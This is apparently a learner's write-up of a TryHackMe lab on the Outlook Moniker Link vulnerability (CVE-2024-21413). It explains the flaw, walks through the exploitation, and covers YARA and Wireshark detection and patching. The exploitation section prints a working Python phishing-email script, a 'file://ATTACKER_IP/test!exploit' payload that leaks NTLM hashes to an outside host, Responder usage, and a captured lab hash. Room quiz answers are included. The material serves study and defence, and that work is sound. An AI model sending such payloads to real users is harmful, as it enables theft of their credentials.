| [Home](../README.md) | [Cyber Security 101](../README.md#cyber-security-101) | **Moniker Link (CVE-2024-21413)** |

## Contents
- [Introduction](#introduction)
- [Moniker Link (CVE-2024-21413)](#moniker-link-cve-2024-21413)
- [Exploitation](#exploitation)
- [Detection](#detection)
- [Remediation](#remediation)
- [Conclusion](#conclusion)


## üìòIntroduction
### Vulnerability Overview
#### Disclosure & Attribution
- On February 13th, 2024, Microsoft disclosed a critical vulnerability affecting Outlook, designated **CVE-2024-21413**, also known as **Moniker Link**.
- Discovered by **Haifei Li** from **Check Point Research**.

#### Technical Summary
- The issue stems from Outlook mishandling **Moniker Links**, a specific type of hyperlink.
- Outlook's security controls can be **bypassed** when a user **clicks** a malicious Moniker Link in an email.
- Once clicked, the vulnerability allows the attacker to:
	- Trigger **Remote Code Execution (RCE)**
	- **Harvest NTLM credentials** by tricking Outlook into authenticating to a remote resource.

#### CVSS Scoring & Details
- **Impact:** Remote Code Execution & Credential Leak
- **Severity:** Critical
- **Attack Complexity:** Low
- **CVSS Score:** 9.8
- **Official Advisory:** [Microsoft MSRC](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413)

#### üß™ Affected Versions
- Microsoft Office LTSC 2021 ‚Äì from version 19.0.0
- Microsoft 365 Apps for Enterprise ‚Äì from version 16.0.1
- Microsoft Office 2019 ‚Äì from version 16.0.1
- Microsoft Office 2016 ‚Äì from version 16.0.0 up to (but not including) 16.0.5435.1001

### Learning Objectives
#### Key Areas of Study
- Understand the internal mechanics of the **Moniker Link vulnerability**
- Explore the role of Outlook‚Äôs **Protected View** and its limitations
- Practice **credential theft via NTLM relay** from an Outlook client
- Learn how to **detect and mitigate** the vulnerability in enterprise environments


### ‚ùì Question - What "Severity" rating has the CVE been assigned?
#### üß™ Process
 - Critical

Trying this as the answer
#### ‚úÖ Answer
- `Critical` ‚úÖ


## üìòMoniker Link (CVE-2024-21413)
### How the Vulnerability Works
#### Outlook Email Rendering & Link Handling
- Outlook can display **HTML-formatted emails**, commonly used in newsletters and marketing content.
- It parses standard hyperlinks like `http://` and `https://`, but also supports **Moniker Links**, which reference **Windows applications** or resources.

#### Protected View & Default Behavior
- When a Moniker Link tries to launch an external application, Outlook prompts a security warning.
- This is due to **Protected View**, a security feature designed to:
	- Open potentially risky content in **read-only mode**
	- **Block active content**, including macros and external protocol handlers

#### Moniker Link Exploitation
- Attackers can craft malicious links using the `file://` protocol:
	```html
	<a href="file://ATTACKER_IP/test">Click me</a>
	```
- This causes Outlook to attempt to access a file via **SMB**, using the victim's **NTLM credentials**.
- However, **Protected View blocks this behavior** under normal conditions.

#### Protected View Bypass
- The core vulnerability lies in a **bypass technique** using the `!` character in the Moniker Link:
	```html
	<a href="file://ATTACKER_IP/test!exploit">Click me</a>
	```
- This modified link:
	- Circumvents Protected View
	- Still triggers **SMB authentication** even if the share or file does not exist
	- Results in **NTLMv2 hashes** being leaked to the attacker's system

#### RCE Potential
- **Remote Code Execution** is technically possible because Moniker Links leverage the **Windows COM (Component Object Model)**.
- However, this room does **not demonstrate RCE**, and **no public proof-of-concept exists** for achieving RCE via this CVE at the time of writing.

### ‚ùì Question 1 - What Moniker Link type do we use in the hyperlink? 
#### üß™ Process
- `file://`

Trying this as the answer
#### ‚úÖ Answer 1
- `file://` ‚úÖ

### ‚ùì Question 2 - What is the special character used to bypass Outlook's "Protected View"?
#### üß™ Process
- `!`

Trying this as the answer
#### ‚úÖ Answer 2
- `!` ‚úÖ


## üìòExploitation
### Exploitation Walkthrough: Sending the Malicious Email
#### Objective of the Attack
- The goal is to send an **email containing a Moniker Link** that **bypasses Protected View** in Outlook.
- When clicked, Outlook will attempt to fetch a file from the attacker's machine, leaking the victim's **netNTLMv2 hash** via SMB authentication.
### Proof of Concept (PoC) Overview
#### Author & Metadata
- **Author:** CMNatic
- **GitHub:** [https://github.com/cmnatic](https://github.com/cmnatic)
- **Version:** 1.0
- **Date:** 19/02/2024

#### Python Email Script Summary
- Sends an HTML-formatted email with a crafted Moniker Link to the victim
- Requires:
	- **Sender email:** `attacker@monikerlink.thm`  
	- **Receiver email:** `victim@monikerlink.thm`  
	- **SMTP server:** `10.10.167.93`  
	- **Email password:** `"attacker"` (for demo purposes)
- Key HTML payload in the message:
	```html
	<a href="file://ATTACKER_MACHINE/test!exploit">Click me</a>
	```
- The script performs:
	- Authentication to the mail server
	- Constructs and sends the email using `smtplib`
	- Uses `MIMEMultipart` and `MIMEText` to format HTML content

### Attack Setup and Execution
#### On the AttackBox
- Edit the PoC script:
	- Update the `file://` link with your **AttackBox IP**
	- Replace `MAILSERVER` with `10.10.167.93`
- Save it as `exploit.py` using `nano` or another editor
- Run the script using:
	```bash
	python3 exploit.py
	```
- Expected output: `Email delivered`
- Troubleshooting: If authentication fails, verify credentials and server values

### SMB Listener with Responder
#### Start Responder to Capture NTLM Hashes
- On the AttackBox, run:
	```bash
	responder -I ens5
	```
- Replace `ens5` with your interface name if using a different environment
- Responder will listen for incoming SMB/LLMNR/NBT-NS traffic

### Victim Environment Interaction
#### Outlook Setup
- Open Outlook on the vulnerable VM via the desktop shortcut
- Dismiss initial setup and license key pop-ups
- Preconfigured victim mailbox will appear

#### Interacting with the Payload
- Wait for the malicious email to arrive
- Click the **"Click me"** link in the email
- This triggers the SMB request to the attacker's IP

### Result: Credential Capture
#### After Email Click
- Outlook attempts to load the file
- SMB authentication is triggered
- **Responder captures the netNTLMv2 hash** from the victim's system

### ‚ùì Question 1 - What is the name of the application that we use on the AttackBox to capture the user's hash?
#### üß™ Process
 - Revisit - I did the task but got wraped up in it and forgot to document. Will revisit later today

Let's get to it, this will be the second time, I've done this process. I did it yesterday and forgot to document the process. So here we are again.

The first step is to grag the PoC from [GitHub: CMNatic / exploit.py](https://github.com/CMNatic/CVE-2024-21413/blob/main/exploit.py). You can `curl` the raw file by clicking 'raw' on the repository
![](Images/Pasted%20image%2020250613121600.png)

Clicking **Raw** will take you to https://raw.githubusercontent.com/CMNatic/CVE-2024-21413/refs/heads/main/exploit.py. Copy this URL for use in a moment.

Change to the **Documents** folder using `cd`

```Shell
‚îå‚îÄ‚îÄ(root„âøkali)-[~]
‚îî‚îÄ# cd Documents
```

Use `curl` to download the raw file pasting the URL copied in the last step.
```Shell
‚îå‚îÄ‚îÄ(root„âøkali)-[~/Documents]
‚îî‚îÄ# curl https://raw.githubusercontent.com/CMNatic/CVE-2024-21413/refs/heads/main/exploit.py > exploit.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1356  100  1356    0     0   5450      0 --:--:-- --:--:-- --:--:--  5467
```

We can `cat` the `exploit.py` file to validate the contents are correct.
```Shell           
‚îå‚îÄ‚îÄ(root„âøkali)-[~/Documents]
‚îî‚îÄ# cat exploit.py 
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.1 | 13/03/2024
Only run this on systems that you own or are explicitly authorised to test (in writing). Unauthorised scanning, testing or exploitation is illegal.
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_IP/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSVERIP', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

Next we need to stage the python python file with the relevent IP's. The ATTACKER_IP is the IP address of the Attack Box / Kali Box, whilst the MAILSVERIP  is the THM SMTP server.

To get the ATTACKER_IP we need to run the command `ip addr` and take note of the connected Ethernet interface. We also want to take a note of the interface for use in a minute.
```Shell
‚îå‚îÄ‚îÄ(root„âøkali)-[~/Documents]
‚îî‚îÄ# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:c6:42:de:40:b5 brd ff:ff:ff:ff:ff:ff
    inet 10.10.178.117/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2502sec preferred_lft 2502sec
    inet6 fe80::c6:42ff:fede:40b5/64 scope link 
       valid_lft forever preferred_lft forever
```

We have an IP of `10.10.178.117` on `eth0`. We can take note of these and update our `ATTACKER_IP` shortly.

The `MAILSVERIP` we can find in the room through. The IP in question is `10.10.7.191`. 

Now we know the relevant IP's we can update the settings in the `exploit.py` file:
- Line 18 (Moniker Link):
	- From: `    <p><a href="file://ATTACKER_IP/test!exploit">Click me</a></p>`
	- To:     `    <p><a href="file://10.10.178.117/test!exploit">Click me</a></p>`
- Line 32 (SMTP Server):
	- From: `server = smtplib.SMTP('MAILSVERIP', 25)`
	- To:     `server = smtplib.SMTP('10.10.7.191', 25)`

Again, I use `vim`, tap `i` to enter _insert_ mode and make the above changes. After we can `esc`followed by `:x` to save and exit and then `cat` the file to validate the changes where successful.
```Shell
‚îå‚îÄ‚îÄ(root„âøkali)-[~/Documents]
‚îî‚îÄ# cat exploit.py 
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.1 | 13/03/2024
Only run this on systems that you own or are explicitly authorised to test (in writing). Unauthorised scanning, testing or exploitation is illegal.
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://10.10.178.117/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('10.10.7.191', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

Fire up the responder tool. This is where we will use the interface we found earlier (`eth0`). Do this in a new terminal as we will still need to use the other terminal.
```
‚îå‚îÄ‚îÄ(root„âøkali)-[~]
‚îî‚îÄ# /usr/sbin/responder -I eth0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.10.178.117]
    Responder IPv6             [fe80::c6:42ff:fede:40b5]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-1KPCZ5KN8ML]
    Responder Domain Name      [3LPE.LOCAL]
    Responder DCE-RPC Port     [48958]

[+] Listening for events...                                                              

[!] Error starting TCP server on port 80, check permissions or other servers running.
```

Leave this running, ignore the error on `port 80` we're only interested in the `smb` port at this time. 

On the target machine fire up Outlook. Tap the `X` top right of the **Sign in** screen. 
![](Images/Pasted%20image%2020250613150637.png)

We don't care about the _Activation_ either
![](Images/Pasted%20image%2020250613150710.png)

We should be left with a single email welcoming you to **Outlook**.
![](Images/Pasted%20image%2020250613150734.png)

One more thing we need to know is the password which is `attacker`.

In the 'other' terminal kick the python script off
```Shell
‚îå‚îÄ‚îÄ(root„âøkali)-[~/Documents]
‚îî‚îÄ# python3 exploit.py
Enter your attacker email password: attacker

Email delivered
```

Head back to the target machine and look for an email. But of course do not click the suspicious email.
![](Images/Pasted%20image%2020250613151535.png)

Because if you do, the attacker will get your token.
```Shell
[SMB] NTLMv2-SSP Client   : 10.10.226.79
[SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme                                    
[SMB] NTLMv2-SSP Hash     : tryhackme::THM-MONIKERLINK:6e91d238720d441b:61FAA3C3FCCBC37ECBDE3FE3E18BC9B2:01010000000000000080761F6CDCDB01EEEF9397FAEB258A000000000200080033004C005000450001001E00570049004E002D0031004B00500043005A0035004B004E0038004D004C0004003400570049004E002D0031004B00500043005A0035004B004E0038004D004C002E0033004C00500045002E004C004F00430041004C000300140033004C00500045002E004C004F00430041004C000500140033004C00500045002E004C004F00430041004C00070008000080761F6CDCDB0106000400020000000800300030000000000000000000000000200000DBDA2FC29438E38BB2FCF6FBFBA00AC5B0002853D8792FA44A829C7D562590260A001000000000000000000000000000000000000900240063006900660073002F00310030002E00310030002E003100370038002E00310031003700000000000000000000000000                                                    
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
```

This is what the user would see.

![](Images/Pasted%20image%2020250613151608.png)

Now we are here, we can answer the first question. The application we used to capture the users hash was `responder` which was found under `/usr/sbin/responder` on the Kali box.

Trying this as the answer
#### ‚úÖ Answer 1
- `responder` ‚úÖ

### ‚ùì Question 2 - What type of hash is captured once the hyperlink in the email has been clicked?
#### üß™ Process
The hash that shows up is `NTLMv2-SSP`. However the answer is `_ _ _ _ _ _ _ _ _` or 9 characters long. `NTLMv2-SSP` is 10. Do we drop the `-`? 

I went through the doc again and found the following line

> leading to the victim's Windows netNTLMv2 hash being sent to the attacker

Trying this as the answer
#### ‚úÖ Answer 2
 - `netNTLMv2` ‚úÖ


## üìòDetection
### Detection & Analysis Techniques
#### YARA Rule Detection
- A YARA rule was created by Florian Roth and X__Junior to detect Moniker Link exploitation attempts in email content related to CVE-2024-21413.
- The rule looks for indicators such as:
	- Email headers like `"Subject: "` and `"Received: "`
	- Suspicious **file paths using `file:///\\` format**, followed by file extensions and a `!` character (indicative of the Protected View bypass)
- Matching logic:
		- File size must be **under 1000KB**
		- All header-related patterns must be present (`$a*`)
		- At least one Moniker-style file path pattern must match (`$xr*`)
- Sample rule:
	```yara
	rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
	   meta:
	      description = "Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook"
	      author = "X__Junior, Florian Roth"
	      reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
	      date = "2024-02-17"
	      modified = "2024-02-19"
	      score = 75
	   strings:
	      $a1 = "Subject: "
	      $a2 = "Received: "
	      $xr1 = /file:\/\/\/\\\\[^"']{6,600}\.(docx|txt|pdf|...|vbs|wsf|xls|xlsm|...|dotm)!/
	   condition:
	      filesize < 1000KB
	      and all of ($a*)
	      and 1 of ($xr*)
	}
	```

### Network Forensics with Wireshark
#### SMB Request Capture
- When the **malicious Moniker Link** is clicked, Outlook sends a **SMB authentication request** to the attacker‚Äôs machine.
- This request can be observed in **Wireshark** and typically contains:
	- A connection attempt over SMB
	- A **truncated netNTLMv2 hash** in the packet capture
	  ![](Images/Pasted%20image%2020250613153650.png)
- This technique can be used by defenders to:
	- Verify attempted exploitation
	- Correlate email payloads with network traffic
	- Extract hash data for forensic analysis


## üìòRemediation
### Mitigation & Best Practices
#### Microsoft Patch Release
- Microsoft released a fix for **CVE-2024-21413** as part of **February 2024 Patch Tuesday**
- The update is available via:
	- **Windows Update**
	- **Microsoft Update Catalog**
	- A full list of **KB articles by Office build** can be referenced on Microsoft's official advisory pages.
#### Security Awareness & User Training
- While the patch addresses the core issue, users should be reminded to follow standard **cyber hygiene practices**:
	- **Do not click** on links from **unsolicited emails**
	- **Preview links** before clicking to ensure they point to legitimate destinations
	- **Forward suspicious emails** to the internal **cybersecurity or IT department**

#### Outlook Configuration & SMB Considerations
- Because this vulnerability **bypasses Outlook's Protected View**, there is **no configuration-based workaround** to fully prevent it.
- **Disabling SMB** system-wide is not advisable due to its critical role in accessing **network shares**.
- However, **firewall-level restrictions** may be used to:
	- Block **outbound SMB connections** to untrusted or external IP addresses
	- Reduce exposure to **unauthorized NTLM credential leaks**


## üìòConclusion
### Conclusion
#### Final Thoughts
- **CVE-2024-21413** poses a significant risk due to its:
	- **Widespread impact** across various Microsoft Office versions
	- **Low attack complexity**, making exploitation relatively easy
- Given the popularity of **Outlook as an email client**, the vulnerability has the potential for **broad abuse** if left unpatched.

#### Patch Reminder
- As a critical reminder:
	- **Update Outlook immediately** via **Windows Update** or the **Microsoft Update Catalog**
	- There is **no user-side configuration** to prevent this attack due to the **Protected View bypass**

#### Wrap-Up
- That concludes the TryHackMe room on **Moniker Link (CVE-2024-21413)**
- The hands-on walkthrough provided insight into:
	- How the vulnerability works
	- How to exploit and detect it
	- How to mitigate and respond